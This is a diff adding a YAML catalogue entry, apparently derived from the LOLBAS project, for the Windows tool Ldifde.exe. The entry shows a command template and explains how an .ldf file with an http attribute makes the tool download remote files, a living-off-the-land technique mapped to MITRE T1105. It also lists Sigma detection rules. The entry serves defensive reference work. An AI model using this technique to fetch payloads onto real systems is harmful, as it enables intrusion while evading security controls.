@@ -1,0 +1,96 @@
+id: lolbas/T1NCaW5hcmllcy9MZGlmZGUueW1s/RG93bmxvYWQ/0
+type: binary
+platform: windows
+name: Ldifde.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: admin
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_export.yml
+  - https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_file_load.yml
+  - https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules-emerging-threats/2019/TA/APT31/proc_creation_win_apt_apt31_judgement_panda.yml
+commands:
+- template: Ldifde -i -f {PATH:.ldf}
+  comment: Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as
+    `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded into IE temp folder.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Ldifde/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Ldifde.exe
+      category: Download
+      privileges: Administrator
+      mitre_id: T1105
+      source_file: OSBinaries/Ldifde.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Ldifde.exe\nDescription: Creates, modifies, and deletes LDAP directory\
+        \ objects.\nAuthor: Grzegorz Tworek\nCreated: 2022-08-31\nCommands:\n  - Command: Ldifde -i -f\
+        \ {PATH:.ldf}\n    Description: Import specified .ldf file into LDAP. If the file contains http-based\
+        \ attrval-spec such as `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded\
+        \ into IE temp folder.\n    Usecase: Download file from Internet\n    Category: Download\n   \
+        \ Privileges: Administrator\n    MitreID: T1105\n    OperatingSystem: Windows Server with AD Domain\
+        \ Services role,  Windows 10 with AD LDS role.\nFull_Path:\n  - Path: c:\\windows\\system32\\\
+        ldifde.exe\n  - Path: c:\\windows\\syswow64\\ldifde.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_export.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_file_load.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules-emerging-threats/2019/TA/APT31/proc_creation_win_apt_apt31_judgement_panda.yml\n\
+        Resources:\n  - Link: https://twitter.com/0gtweet/status/1564968845726580736\nAcknowledgement:\n\
+        \  - Person: Grzegorz Tworek\n    Handle: '@0gtweet'\n"
+      document_sha256: sha256:f10c65a9bcc2dade93bd82d41cb12450fa85f0c5e7a3782175787101c74bf908
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Ldifde/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: admin
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:a68c4c49d9ac92995c57834ef6847770bbc2b24cb6bce0cd3d69861ad0494465
